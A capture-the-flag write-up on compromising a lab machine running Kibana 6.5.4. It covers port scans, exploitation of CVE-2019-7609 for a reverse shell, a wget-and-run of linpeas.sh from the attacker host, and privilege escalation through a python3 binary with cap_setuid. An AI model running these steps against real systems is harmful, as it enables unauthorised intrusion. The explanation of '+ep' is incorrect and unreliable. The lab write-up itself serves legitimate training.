# Kiba

I started with a basic nmap scan to find out which ports are open.

```
$ nmap -p- 10.10.250.164
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-06 14:30 CEST
Nmap scan report for 10.10.250.164
Host is up (0.047s latency).

22/tcp   open  ssh
80/tcp   open  http
5044/tcp open  lxi-evntsvc
5601/tcp open  esmagent
```
Later, I re-scan the host just on the open ports, using `-sV` and `-sC` flags.

```
$ nmap -sC -sV -p 22,80,5044,5601 10.10.250.164

From this scan, I noticed that there is a service on port 5601 reachable via http GET requests. In addition to the one present on port 80.
After that, I re-scan another time the host using `-script vuln` flag.

```

This scan reports that the following host is vulnerable to a known attack known as slow loris. Since this is a DOS-type attack, it is of no interest to us, but it is still useful to report this vulnerability.

So, I checked the service present on port 80, and the only thing I found is a http page with the following message.
```

				Welcome, "linux capabilities" is very interesting.
	
```
Maybe later we might need to check linux capabilities.

Anyway, I switched to the service present on port 5601 where I found a Kibana Instance.

<div><p align="center"><img  src="./img/kibana.png" /></div>

[Kibana](https://www.elastic.co/kibana/) is an free and open frontend application that sits on top of the Elastic Stack, providing search and data visualization capabilities for data indexed in Elasticsearch. Commonly known as the charting tool for the Elastic Stack (previously referred to as the ELK Stack after Elasticsearch, Logstash, and Kibana), Kibana also acts as the user interface for monitoring, managing, and securing an Elastic Stack cluster â€” as well as the centralized hub for built-in solutions developed on the Elastic Stack. Developed in 2013 from within the Elasticsearch community, Kibana has grown to become the window into the Elastic Stack itself, offering a portal for users and companies. 

To know the version of Kibana I made a request via `curl` command.
```
$ curl -XGET http://10.10.250.164:5601/app/kibana >> kibana_info.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 68302  100 68302    0     0   327k      0 --:--:-- --:--:-- --:--:--  328k

```

In the case of `-XGET`, it indicates that I want to send a GET request. A GET request is used to retrieve or fetch resources from a server. It is the most commonly used HTTP method for retrieving data, such as web pages, documents, or API responses, from a specific URL.

I found the version written in a style tag
```
...
</style><style id="themeCss"></style></head><body><kbn-injected-metadata data="{&quot;version&quot;:&quot;6.5.4&quot;,&quot;buildNumber&quot;
...
```

So, now that I know version number (6.5.4) I made some researchs and I found this [github repo](https://github.com/mpgn/CVE-2019-7609) and an article about [CVE-2019-7609](https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability)

<div><p align="center"><img  src="./img/cve.png" /></div>

I followed the instructions in the article, and on my machine I listened for connections via netcat. After a few moments I got a working reverse shell.

```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ 
```

Using a python server, I downloaded `linpeas.sh` script from my attacker machine to a vulnerable machine and I ran it.
```
$ wget http://10.9.15.73:8585/linpeas.sh

$ chmod +x linpeas.sh
$ ./linpeas.sh
```

<div><p align="center"><img  src="./img/linpeas.png" /></div>

The information provided by linpeas indicates that the `/home/kiba/.hackmeplease/python3` file has the capability `cap_setuid+ep`. Let's break down what this means:

* `cap_setuid` refers to the capability to set the user ID when executing the file. This capability allows the program to temporarily change its effective user ID to that of the file owner, even if the user running the program does not have root privileges.
* `+ep` signifies that the file has both the "cap_setuid" capability and the executable permission (the execute permission is represented by "x" in file permissions).

Having the `cap_setuid+ep` capability on a file means that it can be executed with the privileges of its owner, even if the user executing it does not have those privileges. This capability can be potentially abused for privilege escalation attacks if there are vulnerabilities in the file or its associated programs.

<div><p align="center"><img  src="./img/vuln.png" /></div>

I consulted [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) to understand how to exploit this vulnerability.
<div><p align="center"><img  src="./img/gtfobins.png" /></div>

With this command I got a root shell and was able to read the root flag.
